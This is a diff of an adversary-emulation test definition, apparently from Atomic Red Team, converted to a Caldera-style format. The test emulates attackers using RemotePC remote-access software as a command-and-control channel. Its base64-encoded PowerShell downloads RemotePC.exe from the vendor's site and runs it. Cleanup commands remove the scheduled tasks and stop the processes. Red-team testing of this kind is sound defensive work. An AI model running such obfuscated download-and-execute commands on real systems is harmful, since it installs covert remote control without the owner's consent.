@@ -1,17 +1,16 @@
-- id: 5cecf016-3ea4-57bb-b75d-100f9e32f5c1
+- requirements: []
   name: Soumaia ART Tests - RemotePC Software Execution
   description: "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. (requires elevation)"
   tactic: command-and-control
-  technique:
-    attack_id: T1219
-    name: Remote Access Software
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABSAGUAbQBvAHQAZQBQAEMALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AcwB0AGEAdABpAGMALgByAGUAbQBvAHQAZQBwAGMALgBjAG8AbQAvAGQAbwB3AG4AbABvAGEAZABzAC8AcgBwAGMALwAxADQAMAA0ADIAMgAvAFIAZQBtAG8AdABlAFAAQwAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAUgBlAG0AbwB0AGUAUABDAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcACgA=
-          }
-          Start-Process "$env:TEMP\ART-ExternalPayloads\RemotePC.exe"
-        cleanup: "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue"
+  technique_id: T1219
+  technique_name: Remote Access Software
+  executors:
+  - cleanup:
+    - Unregister-ScheduledTask -TaskName "RemotePC" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName "RPCServiceHealthCheck" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName "ServiceMonitor" -Confirm:$False -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName "StartRPCService" -Confirm:$False -ErrorAction SilentlyContinue; Stop-Process -Name "RemotePCPerformance" -force -erroraction silentlycontinue; Stop-Process -Name "RPCPerformanceService" -force -erroraction silentlycontinue; Stop-Process -Name "RemotePCUIU" -force -erroraction silentlycontinue; Stop-Process -Name "RPCDownloader" -force -erroraction silentlycontinue; Stop-Process -Name "RemotePCService" -force -erroraction silentlycontinue; Stop-Process -Name "RPCService" -force -erroraction silentlycontinue
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABSAGUAbQBvAHQAZQBQAEMALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AcwB0AGEAdABpAGMALgByAGUAbQBvAHQAZQBwAGMALgBjAG8AbQAvAGQAbwB3AG4AbABvAGEAZABzAC8AcgBwAGMALwAxADQAMAA0ADIAMgAvAFIAZQBtAG8AdABlAFAAQwAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAUgBlAG0AbwB0AGUAUABDAC4AZQB4AGUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcACgA= }; Start-Process "$env:TEMP\ART-ExternalPayloads\RemotePC.exe"
+  id: 5cecf016-3ea4-57bb-b75d-100f9e32f5c1
